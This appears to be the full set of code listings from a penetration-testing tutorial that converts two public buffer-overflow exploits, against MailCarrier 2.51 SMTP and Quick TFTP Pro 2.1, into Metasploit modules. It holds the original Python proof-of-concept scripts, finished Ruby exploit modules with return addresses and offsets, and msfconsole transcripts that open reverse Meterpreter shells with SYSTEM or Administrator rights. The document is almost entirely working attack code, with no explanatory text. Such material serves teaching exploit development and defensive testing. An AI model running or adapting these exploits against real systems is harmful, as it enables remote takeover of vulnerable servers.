["```\n#!/usr/bin/python\n#########################################################\n# MailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow     #\n# Advanced, secure and easy to use Mail Server.         #\n# 23 Oct 2004 - muts                                    #\n#########################################################\n\nimport struct\nimport socket\n\nprint \"\\n\\n###############################################\"\nprint \"\\nMailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow\"\nprint \"\\nFound & coded by muts [at] whitehat.co.il\"\nprint \"\\nFor Educational Purposes Only!\\n\"\nprint \"\\n\\n###############################################\"\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\nbuffer = \"\\x41\" * 5093\nbuffer += \"\\42\" * 4\nbuffer += \"\\x90\" * 32\nbuffer += \"\\xcc\" * 1000\n\ntry:\n    print \"\\nSending evil buffer...\"\n    s.connect(('192.168.1.155',25))\n    s.send('EHLO ' + buffer + '\\r\\n')\n    data = s.recv(1024)\n    s.close()\n    print \"\\nDone!\"\nexcept:\n    print \"Could not connect to SMTP!\"\n```", "```\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n        Rank = GoodRanking\n             include Msf::Exploit::Remote::Tcp\n\n        def initialize(info = {})\n            super(update_info(info,\n                  'Name'             => 'TABS MailCarrier v2.51 SMTP EHLO Overflow',\n                       'Description' => %q{\n                       This module exploits the MailCarrier v2.51 suite SMTP service.\n                       The stack is overwritten when sending an\n overly long EHLO command.\n                       },\n                       'Author'      => [ 'Your Name' ],\n                       'Arch'        => [ ARCH_X86 ],\n                       'License'     => MSF_LICENSE,\n                       'Version'     => '$Revision: 7724 $',\n                       'References'  =>\n                        [\n                              [ 'CVE', '2004-1638' ],\n                              [ 'OSVDB', '11174' ],\n                              [ 'BID', '11535' ],\n                              [ 'URL', 'http://www.exploit-db.com/exploits/598' ],\n                       ],\n                       'Privileged'          => true,\n                       'DefaultOptions'      =>\n                       {\n                              'EXITFUNC'     => 'thread',\n                       },\n                       'Payload' =>\n                              {\n                                      'Space'                => 300,\n                                      'BadChars'             => \"\\x00\\x0a\\x0d\\x3a\",\n                                      'StackAdjustment'      => −3500,\n                              },\n                       'Platform' => ['win'],\n                       'Targets'  =>\n                       [\n                                   [ 'Windows XP SP2 - EN', { 'Ret'\n => `0xdeadbeef` } ],\n                       ],\n                       'DisclosureDate' => 'Oct 26 2004',\n                       'DefaultTarget'  => 0))\n\n                       register_options(\n                        [\n                                     Opt::RPORT(`25`),\n                              Opt::LHOST(), # Required for stack offset\n                        ], self.class)\n       end\n\n       def exploit\n              connect\n\n                 sock.put(sploit + \"\\r\\n\")\n\n              handler\n              disconnect\n       end\n\nend\n```", "```\ndef exploit\n       connect\n\n     sploit = \"`EHLO` \"\n     sploit << \"\\x41\" * `5093`\n     sploit << \"\\x42\" * `4`\n     sploit << \"`\\x90`\" * 32\n     sploit << \"`\\xcc`\" * 1000\n\n       sock.put(sploit + \"\\r\\n\")\n\n       handler\n       disconnect\nend\n```", "```\nmsf > `use exploit/windows/smtp/mailcarrier_book`\n  msf exploit(mailcarrier_book) > `show options`\n\n  Module options:\n\n     Name   Current Setting  Required  Description\n     ----   ---------------  --------  -----------\n     LHOST                   yes       The local address\n     RHOST                   yes       The target address\n     RPORT  25               yes       The target port\n\n  Exploit target:\n\n     Id  Name\n     --  ----\n     0   Windows XP SP2 - EN\n\n  msf exploit(mailcarrier_book) > `set LHOST 192.168.1.101`\n  LHOST => 192.168.1.101\n  msf exploit(mailcarrier_book) > `set RHOST 192.168.1.155`\n  RHOST => 192.168.1.155\n msf exploit(mailcarrier_book) > `set payload generic/debug_trap`\n  payload => generic/debug_trap\n  msf exploit(mailcarrier_book) > `exploit`\n  [*] Exploit completed, but no session was created.\n  msf exploit(mailcarrier_book) >\n```", "```\n'Targets' =>\n       [\n              [ 'Windows XP SP2 - EN', { 'Ret' => `0x7d17dd13` } ],\n       ],\n```", "```\nsploit = \"EHLO \"\nsploit << \"\\x41\" * 5093\nsploit << [target['Ret']].pack('V')\nsploit << \"\\x90\" * 32\nsploit << \"\\xcc\" * 1000\n```", "```\n'Targets' =>\n       [\n                 [ 'Windows XP SP2 - EN', { 'Ret' =>\n 0x7d17dd13, `'Offset' => 5093` } ],\n       ],\n```", "```\nsploit = \"EHLO \"\nsploit << `rand_text_alpha_upper`(target['Offset']\nsploit << [target['Ret']].pack('V')\nsploit << \"\\x90\" * 32\nsploit << \"\\xcc\" * 1000\n```", "```\nsploit = \"EHLO \"\nsploit << rand_text_alpha_upper(target['Offset'])\nsploit << [target['Ret']].pack('V')\nsploit << `make_nops(32)`\nsploit << \"\\xcc\" * 1000\n```", "```\nsploit = \"EHLO \"\nsploit << rand_text_alpha_upper(target['Offset'])\nsploit << [target['Ret']].pack('V')\nsploit << make_nops(32)\nsploit << `payload.encoded`\n```", "```\nmsf exploit(mailcarrier_book) > `set payload windows/meterpreter/reverse_tcp`\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(mailcarrier_book) > `exploit`\n\n[*] Started reverse handler on 192.168.1.101:4444\n[*] Sending stage (747008 bytes)\n[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.155:1265)\n\nmeterpreter > `getuid`\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter >\n```", "```\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n       Rank = GoodRanking\n\n       include Msf::Exploit::Remote::Tcp\n\n       def initialize(info = {})\n              super(update_info(info,\n                     'Name'           => 'TABS MailCarrier v2.51 SMTP EHLO Overflow',\n                     'Description'    => %q{\n                     This module exploits the MailCarrier v2.51 suite SMTP service.\n                     The stack is overwritten when sending\n an overly long EHLO command.\n                     },\n                     'Author'         => [ 'Your Name' ],\n                     'Arch'           => [ ARCH_X86 ],\n                     'License'        => MSF_LICENSE,\n                     'Version'        => '$Revision: 7724 $',\n                     'References'     =>\n                     [\n                              [ 'CVE', '2004-1638' ],\n                              [ 'OSVDB', '11174' ],\n                              [ 'BID', '11535' ],\n                              [ 'URL', 'http://www.exploit-db.com/exploits/598' ],\n                     ],\n                     'Privileged'            => true,\n                     'DefaultOptions'        =>\n                     {\n                              'EXITFUNC'     => 'thread',\n                     },\n                     'Payload' =>\n                              {\n                                      'Space'               => 1000,\n                                      'BadChars'            => \"\\x00\\x0a\\x0d\\x3a\",\n                                      'StackAdjustment'     => −3500,\n                              },\n                     'Platform' => ['win'],\n                     'Targets'  =>\n                     [\n                              [ 'Windows XP SP2 - EN',\n { 'Ret' => 0x7d17dd13, 'Offset' => 5093 } ],\n                     ],\n                     'DisclosureDate' => 'Oct 26 2004',\n                     'DefaultTarget'  => 0))\n\n                     register_options(\n                     [\n                              Opt::RPORT(25),\n                              Opt::LHOST(), # Required for stack offset\n                     ], self.class)\n        end\n\n        def exploit\n              connect\n\n              sploit = \"EHLO \"\n              sploit << rand_text_alpha_upper(target['Offset'])\n              sploit << [target['Ret']].pack('V')\n              sploit << make_nops(32)\n              sploit << payload.encoded\n              sock.put(sploit + \"\\r\\n\")\n\n              handler\n              disconnect\n        end\n\nend\n```", "```\n#!/usr/bin/python\n# Quick TFTP Pro 2.1 SEH Overflow (0day)\n# Tested on Windows XP SP2.\n# Coded by Mati Aharoni\n# muts..at..offensive-security.com\n# http://www.offensive-security.com/0day/quick-tftp-poc.py.txt\n#########################################################\nimport socket\nimport sys\n\nprint \"[*] Quick TFTP Pro 2.1 SEH Overflow (0day)\"\nprint \"[*] http://www.offensive-security.com\"\n\nhost = '127.0.0.1'\nport = 69\n\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nexcept:\n    print \"socket() failed\"\n    sys.exit(1)\n\nfilename = \"pwnd\"\nshell = \"\\xcc\" * 317\n\nmode = \"A\"*1019+\"\\xeb\\x08\\x90\\x90\"+\"\\x58\\x14\\xd3\\x74\"+\"\\x90\"*16+shell\n\nmuha = \"\\x00\\x02\" + filename+ \"\\0\" + mode + \"\\0\"\n\nprint \"[*] Sending evil packet, ph33r\"\ns.sendto(muha, (host, port))\nprint \"[*] Check port 4444 for bindshell\"\n```", "```\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n\n        `include Msf::Exploit::Remote::Udp`\n        `include Msf::Exploit::Remote::Seh`\n\n       def initialize(info = {})\n              super(update_info(info,\n                     'Name'           => 'Quick TFTP Pro\n 2.1 Long Mode Buffer Overflow',\n                     'Description'    => %q{\n                            This module exploits a stack overflow\n in Quick TFTP Pro 2.1.\n                     },\n                     'Author'         => 'Your Name',\n                     'Version'        => '$Revision: 7724 $',\n                     'References'     =>\n                            [\n                                    ['CVE', '2008-1610'],\n                                    ['OSVDB', '43784'],\n                                    ['URL', 'http://www.\nexploit-db.com/exploits/5315'],\n                            ],\n                     'DefaultOptions' =>\n                            {\n                                   'EXITFUNC' => 'thread',\n                            },\n                     'Payload'        =>\n                            {\n                                   'Space'    => 412,\n                                   'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n                                   'StackAdjustment' => −3500,\n                            },\n                     'Platform'       => 'win',\n                     'Targets'        =>\n                            [\n                                    [ 'Windows XP SP2',    { 'Ret' => 0x41414141 } ],\n                            ],\n                     'Privileged'     => true,\n                     'DefaultTarget'  => 0,\n                     'DisclosureDate' => 'Mar 3 2008'))\n\n                      register_options([`Opt::RPORT(69)`], self.class)\n\n       end\n\n       def exploit\n              connect_udp\n\n              print_status(\"Trying target #{target.name}...\")\n\n                 `udp_sock.put(sploit)`\n\n              disconnect_udp\n       end\n\nend\n```", "```\ndef exploit\n       connect_udp\n\n       print_status(\"Trying target #{target.name}...\")\n\n       evil = \"\\x41\" * 1019\n     `evil << \"\\xeb\\x08\\x90\\x90\"`  # Short Jump\n     `evil << \"\\x58\\x14\\xd3\\x74\"`  # POP-POP-RETN\n       evil << \"\\x90\" * 16   # NOP slide\n       evil << \"\\xcc\" * 412  # Dummy Shellcode\n\n     sploit = \"\\x00\\x02\"\n       sploit << \"pwnd\"\n       sploit << \"\\x00\"\n       sploit << evil\n       sploit << \"\\x00\"\n\n       udp_sock.put(sploit)\n\n       disconnect_udp\nend\n```", "```\nevil = `rand_text_alpha_upper(1019`)   # Was: \"\\x41\" * 1019\nevil << \"\\xeb\\x08\\x90\\x90\"           # Short Jump\nevil << \"\\x58\\x14\\xd3\\x74\"           # pop/pop/ret\nevil << `make_nops(16)`                # Was: \"\\x90\" * 16  # NOP slide\nevil << \"\\xcc\" * 412                 # Dummy Shellcode\n```", "```\n'Targets'        =>\n      [\n              [ 'Windows XP SP2',  { 'Ret' => 0x74d31458 } ], # p/p/r oledlg\n      ],\n```", "```\nevil = rand_text_alpha_upper(1019)\nevil << `generate_seh_payload`(target.ret)\nevil << make_nops(16)\n```", "```\nmsf > `use exploit/windows/tftp/quicktftp_book`\nmsf exploit(quicktftp_book) > `set payload windows/meterpreter/reverse_tcp`\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(quicktftp_book) > `set LHOST 192.168.1.101`\nLHOST => 192.168.1.101\nmsf exploit(quicktftp_book) > `set RHOST 192.168.1.155`\nRHOST => 192.168.1.155\nmsf exploit(quicktftp_book) > `exploit`\n\n[*] Started reverse handler on 192.168.1.101:4444\n[*] Trying target Windows XP SP2...\n[*] Sending stage (747008 bytes)\n[*] Meterpreter session 2 opened (192.168.1.101:4444 -> 192.168.1.155:1036)\nmeterpreter > `getuid`\nServer username: V-XP-SP2-BARE\\Administrator\n```", "```\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n        include Msf::Exploit::Remote::Udp\n        include Msf::Exploit::Remote::Seh\n\n        def initialize(info = {})\n                super(update_info(info,\n                        'Name'           => 'Quick TFTP Pro 2.1\n Long Mode Buffer Overflow',\n                        'Description'    => %q{\n                                This module exploits a stack\n overflow in Quick TFTP Pro 2.1.\n                        },\n                        'Author'         => 'Your Name',\n                        'Version'        => '$Revision: 7724 $',\n                        'References'     =>\n                                [\n                                         ['CVE', '2008-1610'],\n                                         ['OSVDB', '43784'],\n                                         ['URL', 'http://www.exploit-\ndb.com/exploits/5315'],\n                                ],\n                        'DefaultOptions' =>\n                                {\n                                         'EXITFUNC' => 'thread',\n                                },\n                        'Payload'        =>\n                                {\n                                         'Space'    => 412,\n                                         'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n                                         'StackAdjustment' => −3500,\n                                },\n                        'Platform'       => 'win',\n                        'Targets'        =>\n                                [\n                                         [ 'Windows XP SP2',\n     { 'Ret' => 0x74d31458 } ],\n                                               # p/p/r oledlg\n                                ],\n                        'Privileged'     => true,\n                        'DefaultTarget'  => 0,\n                        'DisclosureDate' => 'Mar 3 2008'))\n\n                        register_options([Opt::RPORT(69)], self.class)\n\n        end\n\n        def exploit\n                connect_udp\n\n                print_status(\"Trying target #{target.name}...\")\n\n                evil = rand_text_alpha_upper(1019)\n                evil << generate_seh_payload(target.ret)\n                evil << make_nops(16)\n\n                sploit = \"\\x00\\x02\"\n                sploit << \"pwnd\"\n                sploit << \"\\x00\"\n                sploit << evil\n                sploit << \"\\x00\"\n\n                udp_sock.put(sploit)\n\n                disconnect_udp\n        end\n\nend\n```"]